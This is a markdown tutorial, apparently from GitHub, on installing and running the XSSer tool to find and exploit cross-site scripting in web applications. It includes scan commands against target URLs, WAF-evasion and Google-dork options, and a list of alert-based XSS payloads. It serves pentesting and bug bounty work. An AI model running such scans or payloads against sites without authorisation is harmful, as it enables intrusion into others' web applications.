<img src="https://github.com/user-attachments/assets/ae75faa2-e7f8-4f45-8462-946b100a3e57" style="width: 100%;" alt="zika1">


## What is XSSer?

**XSSer** is an **automated tool** written in Python used to detect and exploit **Cross-Site Scripting (XSS)** vulnerabilities in web applications. It supports **GET**, **POST**, and even **DOM-based XSS** vectors.

It’s part of the offensive security toolkit and can be useful in **bug bounty**, **pentesting**, or **self-assessment** of web applications.

---

##  Installation

```bash
git clone https://github.com/epsylon/xsser
cd xsser
sudo python3 setup.py install
```

> You may need to install dependencies such as:

```bash
sudo apt install python3-setuptools python3-pycurl
```

---

##  How XSSer Works

XSSer takes a URL or form input and tries various **XSS payloads** to see if it gets reflected or executed in the browser. It automatically injects the payloads into **parameters**, and checks for common behavior that signals an XSS vulnerability, like:

* Reflected scripts in HTML
* Alert boxes triggered
* Execution of injected JavaScript

It supports:

* **Reflected XSS**
* **Stored XSS**
* **DOM-based XSS**
* **XML/XSS vectors**
* **Obfuscation techniques**

---

## Basic Usage

### 1. Scan a single URL for XSS:

```bash
./xsser --url "http://target.com/index.php?search=query"
```

This command will fuzz the `search` parameter for XSS.

---

### 2. Scan with specific method (GET or POST)

#### GET example:

```bash
./xsser --url "http://target.com/page.php?name=test"
```

#### POST example:

```bash
./xsser --url "http://target.com/login.php" --data "username=test&password=test"
```

---

### 3. Use a proxy (Burp Suite / OWASP ZAP)

```bash
./xsser --url "http://target.com/" --proxy="http://127.0.0.1:8080"
```

Useful to observe traffic and manual debugging.

---

### 4. Custom payloads (use your own instead of built-in ones)

```bash
./xsser --url "http://site.com/page.php?q=query" --payload="</script><script>alert(1)</script>"
```

---

### 5. Use GUI version (if you're not comfortable with CLI)

```bash
./xsser --gtk
```

Opens a graphical interface.

---

##  Target Examples

### Example 1: Reflected XSS

```bash
./xsser --url "http://testphp.vulnweb.com/search.php?test=query"
```

If the parameter `test` reflects back in the HTML, XSSer will try to inject payloads like:

```html
<script>alert('XSS')</script>
```

And confirm if it executes.

---

### Example 2: POST XSS

```bash
./xsser --url "http://example.com/comment" --data "name=test&message=hello"
```

If the comment form reflects the message or stores it and shows it to other users, XSSer will detect stored or reflected XSS.

---

##  How to Read Results

XSSer returns:

* Vulnerable parameter(s)
* Type of XSS (Reflected / Stored / DOM)
* Payload that worked
* Code snippet (optional)

Sample output:

```
[+] Vulnerable parameter: search
[+] Injected Payload: <script>alert(1337)</script>
[+] Type: Reflected XSS
```

---

##  Advanced Options

| Option            | Description                                          |
| ----------------- | ---------------------------------------------------- |
| `--Cw`            | Crawl the site and test more links                   |
| `--Auto`          | Automatically detect parameters                      |
| `--delay`         | Delay between requests (bypass WAFs)                 |
| `--fuzz-method`   | Choose method: GET/POST/XML                          |
| `--final-payload` | Provide final payload after finding injectable param |
| `--dork`          | Use Google dorks to find XSS-prone URLs              |
| `--threads`       | Speed up by multithreading                           |

---

##  Real-World Use Cases

*  **Bug Bounty Recon:** Use XSSer on target URLs gathered from wayback, subdomain enum, or link crawlers.
*  **Pentesting:** Automate injection in QA or production environments for security audits.
*  **Validation:** Test your custom payloads before submitting reports.

---

##  Limitations

* Some modern **WAFs and filters** block known payloads, even obfuscated ones.
* Some JS-heavy apps require **manual DOM testing**.
* XSSer may miss complex or logic-based XSS unless the attacker helps it by providing better-crafted payloads.

---

##  Tips to Get the Most Out of XSSer

1. Always inspect requests in **Burp Suite** or **browser dev tools** first.
2. Use tools like `waybackurls`, `gau`, or `hakrawler` to collect many URLs to test with XSSer.
3. Combine with **ParamSpider** to find hidden parameters.
4. Don't rely 100% on automation — use it to speed up and validate manual testing.

---

##  Summary

| Feature   | Description                                  |
| --------- | -------------------------------------------- |
| Tool Name | XSSer                                        |
| Language  | Python                                       |
| Targets   | Reflected, Stored, DOM-based XSS             |
| Supports  | GET, POST, XML, proxy, payload customization |
| Install   | `git clone https://github.com/epsylon/xsser` |

---

##  Example Payloads Used by XSSer

* `<script>alert(1)</script>`
* `"><svg/onload=alert(1)>`
* `"><img src=x onerror=alert(1)>`
* `<body onload=alert(1)>`
* `<iframe src=javascript:alert(1)>`

